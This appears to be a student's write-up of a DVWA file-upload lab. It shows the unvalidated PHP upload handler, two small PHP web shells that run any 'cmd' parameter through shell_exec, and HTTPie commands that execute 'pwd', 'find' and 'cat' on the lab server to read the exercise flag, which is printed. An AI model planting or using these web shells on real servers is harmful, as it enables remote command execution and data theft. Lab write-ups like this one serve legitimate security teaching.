= Assignment: DVWA File Upload <assignment-3>

== Overview and Definitions

The preparation for this DVWA file upload assignment is similar to the two previous exercises, but the attack vector is different. The vulnerability being exploited is the file upload functionality of DVWA, which allows users to upload files to the server using HTML's form element with enctype set to `multipart/form-data`. The key source I used for this was a book _Learn Kali Linux 2019_ by Joshua Crumbaugh and Glen Singh (Packt Publishing, 2019). The Chapter _"Performing Website Penetration Testing"_ has a section _"Exploiting file upload vulnerabilities"_. In that section, the payload is generated using msfvenom to create a reverse shell in the form of a PHP file. I am not sure if there are open ports, so I will use a simpler method.

== Target Setup and Relevant Code

The vulnerable site allows me to upload any file. The page has no validation for the file type, not even checking the file extension. The uploaded files are stored in the `/app/vulnerabilities/upload` directory. The PHP code that handles the file upload is as follows:

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // If else logic snipped out
    move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path );
}
?> 
```

The suggested file in the assignment echoes the output of e.g. `scandir("/")`. I does work, but changing the command requires changing the file and uploading it again. Thus, I will use a different approach.

== Observations

My initial idea was a file like this:

```php
<?php
if(isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
```

And then, I can run commands by accessing URL like this in the browser: `http://193.167.189.112:2787/hackable/uploads/runcmd.php?cmd=pwd`.

However, this approach has a problem. URL needs to be encoded, so handling this manually in the browser would be cumbersome. Thus, I moved into using HTTP POST and HTTPie to send the command as a form parameter. Thus, I uploaded a `runpost.php` with content:

```php
<?php
if(isset($_POST['cmd'])) {
    echo shell_exec($_POST['cmd']);
}
?>
```

Then, I can run commands like this in Bash:

```bash
URI='http://193.167.189.112:2787/hackable/uploads/runpost.php'
http -f POST $URI cmd="pwd"
http -f POST $URI cmd='find / -name "Upload_*.php"'
```

== Assignment Solution

Now I had all the pieces of the puzzle. I simply echoed the contents of the `Upload_18021.php` file:

```bash-console
$ http -f POST $URI cmd='cat /app/hackable/Upload_18021.php'

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 102
Content-Type: text/html
Date: Fri, 01 May 2026 13:49:11 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.25

<?php
// Upload flag: 73b9c5c811e8a2b165213b28caf46a1b1d029cde7220fd2e18108e4d7cfd10ba
?>
```
The flag is clearly visible in the HTTPie output. My observetions confirm that the file upload vulnerability is exploitable and allows an attacker to execute arbitrary commands on the server. Thus, I would rate this vulnerability as *CRITICAL*.
